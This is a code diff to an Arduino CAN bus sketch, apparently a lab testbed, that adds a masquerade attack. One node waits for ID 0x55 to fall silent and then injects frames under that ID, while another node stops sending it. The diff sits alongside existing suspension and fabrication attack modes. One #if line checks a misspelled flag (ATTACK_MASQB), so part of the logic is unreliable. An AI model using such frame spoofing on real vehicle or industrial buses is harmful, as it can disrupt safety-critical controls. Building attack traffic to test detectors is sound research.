@@ -61,13 +61,30 @@ void loop() {
   static byte blinkDiv = 0;
   static bool announced = false;
 
+#ifdef ATTACK_MASQ_A
+  static unsigned long last55 = 0;
+  static unsigned int count55 = 0;
+  static bool masq = false;
+  while (CAN0.checkReceive() == CAN_MSGAVAIL) {
+    unsigned long rid; byte rlen; byte rbuf[8];
+    CAN0.readMsgBuf(&rid, &rlen, rbuf);
+    if (rid == 0x55) { last55 = millis(); count55++; }
+  }
+  // take over only after 200+ frames seen and 300 ms of real silence
+  if (!masq && count55 > 200 && millis() - last55 > 300) {
+    masq = true;
+    Serial.print("MASQUERADE ACTIVE at ms=");
+    Serial.println(millis());
+  }
+#endif
+
   if (!tick) return;
   tick = false;
 
   bool attack = millis() >= ATTACK_AT_S * 1000UL;
   if (attack && !announced) {
     announced = true;
-#if defined(ATTACK_SUSPEND) || defined(ATTACK_FABRICATE)
+#if defined(ATTACK_SUSPEND) || defined(ATTACK_FABRICATE) || defined(ATTACK_MASQB)
     Serial.println("ATTACK ACTIVE");
 #endif
   }
@@ -75,6 +92,9 @@ void loop() {
   byte data[8] = {counter, 0, 0, 0, 0, 0, 0, 0};
 
   for (byte i = 0; i < NUM_IDS; i++) {
+#ifdef ATTACK_MASQ_B
+    if (attack && IDS[i] == 0x55) continue;          // B goes silent on 0x55
+#endif
 #ifdef ATTACK_SUSPEND
     if (attack && IDS[i] == 0x11) continue;     // suspension: 0x11 goes silent, 0x13 keeps running
 #endif
@@ -90,6 +110,9 @@ void loop() {
     byte fake[8] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     CAN0.sendMsgBuf(0x11, 0, 8, fake);
   }
+#endif
+#ifdef ATTACK_MASQ_A
+  if (masq) CAN0.sendMsgBuf(0x55, 0, 8, data);       // A now sends B's ID, same period
 #endif
   counter++;
 
